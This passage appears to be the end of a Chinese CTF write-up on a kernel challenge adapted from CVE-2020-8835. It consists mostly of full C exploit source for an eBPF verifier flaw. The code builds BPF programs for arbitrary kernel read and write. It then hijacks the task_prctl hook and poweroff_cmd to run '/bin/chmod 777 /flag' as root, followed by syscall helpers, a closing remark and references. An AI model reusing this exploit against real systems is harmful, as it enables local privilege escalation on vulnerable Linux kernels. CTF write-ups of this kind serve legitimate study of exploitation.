        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \
        BPF_EXIT_INSN(),                                  /*   exit(0);             */   \
        BPF_MOV64_REG((dst), BPF_REG_0)               /* r_dst = (r0)   */
    int ctrlmapfd, expmapfd;
    int progfd;
    int sockets[2];
    char bpf_log_buf[LOG_BUF_SIZE];
    void gen_fake_elf(){
        system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/chmod"); 
        system("chmod +x /tmp/chmod");
        system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fake");
        system("chmod +x /tmp/fake");
    }
    void init(){
        setbuf(stdin,0);
        setbuf(stdout,0);
        //gen_fake_elf();
    }
    void x64dump(char *buf,uint32_t num){         
        uint64_t *buf64 =  (uint64_t *)buf;       
        printf("[-x64dump-] start : \n");         
        for(int i=0;i> 1
        BPF_ALU64_IMM(BPF_LSH,8,1),     //r8 >= 32
        BPF_ALU64_IMM(BPF_MUL,8,0x110/2), //r8 *= 0x110
        BPF_LD_MAP_FD(9,4),      //r9 = exp_map_fd
        BPF_MAP_GET_ADDR(0,7),          //r7 = &exp_map
        BPF_ALU64_REG(BPF_SUB,7,8),     //r7 -= r8
        BPF_LDX_MEM(BPF_DW,0,7,0),      //r0 = [r7+0]
        BPF_STX_MEM(BPF_DW,6,0,0x10),   //r6+0x10 = r0 = ctrl_map[2]
        BPF_LDX_MEM(BPF_DW,0,7,0xc8),   //r0 = [r7+0xc0]
        BPF_STX_MEM(BPF_DW,6,0,0x18),   //r6+0x18 = r0 = ctrl_map[3]
        BPF_ALU64_IMM(BPF_ADD,0,0x50),  //r0 += 0x50 => element_addr
        BPF_LDX_MEM(BPF_DW,8,6,8),      //r8 = [r6+8] = ctrl_map[1]
        BPF_JMP_IMM(BPF_JNE,8,0x2,4),
        //arb write
        BPF_STX_MEM(BPF_DW,7,0,0),      //[r7] = [ops] = r0 = element_addr
        BPF_ST_MEM(BPF_W,7,0x18,BPF_MAP_TYPE_STACK),//[ops+0x18] = BPF_MAP_TYPE_STACK
        BPF_ST_MEM(BPF_W,7,0x24,-1),   //max_entries
        BPF_ST_MEM(BPF_W,7,0x2c,0),    //locak_off
        //exit
        BPF_ALU64_IMM(BPF_MOV,0,0),     //
        BPF_EXIT_INSN(),
    };
    void  prep(){
        ctrlmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x100,0x1);
        if(ctrlmapfdhook.task_prctl
        uint64_t poweroff_work_func = 0xFFFFFFFF8108B240 + kaslr;
        uint64_t poweroff_cmd = 0xFFFFFFFF82448260 + kaslr;
        uint64_t hp_hook = 0xffffffff824b3fa0 + kaslr;
        expbuf64[0] = (poweroff_work_func & 0xffffffff) - 1;
        bpf_update_elem(expmapfd,&key,expbuf,hp_hook);
        expbuf64[0] = (poweroff_work_func >> 32) - 1;
        bpf_update_elem(expmapfd,&key,expbuf,hp_hook+4);
        //overwite poweroff_cmd to "/bin/chmod 777 /flag"
        expbuf64[0] = 0x6e69622f - 1;
        bpf_update_elem(expmapfd,&key,expbuf,poweroff_cmd);
        expbuf64[0] = 0x6d68632f - 1;
        bpf_update_elem(expmapfd,&key,expbuf,poweroff_cmd+4);
        expbuf64[0] = 0x3720646f - 1;
        bpf_update_elem(expmapfd,&key,expbuf,poweroff_cmd+8);
        expbuf64[0] = 0x2f203737 - 1;
        bpf_update_elem(expmapfd,&key,expbuf,poweroff_cmd+0xc);
        expbuf64[0] = 0x67616c66 - 1;
        bpf_update_elem(expmapfd,&key,expbuf,poweroff_cmd+0x10);
        //trigger
        prctl(0,0);
        return;
    }
    int main(int argc,char **argv){
        init();
        prep();
        pwn();
        return 0;
    }
    static void __exit(char *err) {              
        fprintf(stderr, "error: %s\n", err); 
        exit(-1);                            
    }                                            
    static void writemsg(void) 
    {
        char buffer[64];
        ssize_t n = write(sockets[0], buffer, sizeof(buffer));
        if (n < 0) {
            perror("write");
            return;
        }
        if (n != sizeof(buffer))
            fprintf(stderr, "short write: %lu\n", n);
    }
    static int bpf_prog_load(enum bpf_prog_type prog_type,         
            const struct bpf_insn *insns, int prog_len,  
            const char *license, int kern_version){
        union bpf_attr attr = {                                        
            .prog_type = prog_type,                                
            .insns = (uint64_t)insns,                              
            .insn_cnt = prog_len / sizeof(struct bpf_insn),        
            .license = (uint64_t)license,                          
            .log_buf = (uint64_t)bpf_log_buf,                      
            .log_size = LOG_BUF_SIZE,                              
            .log_level = 1,                                        
        };                                                             
        attr.kern_version = kern_version;                              
        bpf_log_buf[0] = 0;                                            
        return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));  
    }
    static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,  
            int max_entries){
        union bpf_attr attr = {                                         
            .map_type = map_type,                                   
            .key_size = key_size,                                   
            .value_size = value_size,                               
            .max_entries = max_entries                              
        };                                                              
        return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));  
    }                                                
    static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags){
        union bpf_attr attr = {                                              
            .map_fd = fd,                                                
            .key = (uint64_t)key,                                        
            .value = (uint64_t)value,                                    
            .flags = flags,                                              
        };                                                                   
        return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));  
    }
    static int bpf_lookup_elem(int fd,void *key, void *value){
        union bpf_attr attr = {                                              
            .map_fd = fd,                                                
            .key = (uint64_t)key,                                        
            .value = (uint64_t)value,                                    
        };                                                                   
        return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));  
    }
## 结束语
这道题目很好地改编了CVE，非常考验对于bpf指令检测的了解和调试，综合难度很高，再次感谢`sunichi`师傅的帮助。
## 参考
[CVE-2020-8835 pwn2own 2020 ebpf
提权漏洞分析](https://www.anquanke.com/post/id/203416)
[CVE-2020-8835 pwn2own 2020 ebpf 通过任意读写提权分析](https://xz.aliyun.com/t/7690)
[Kernel Pwn 学习之路 - 番外](https://www.anquanke.com/post/id/204319#h3-10)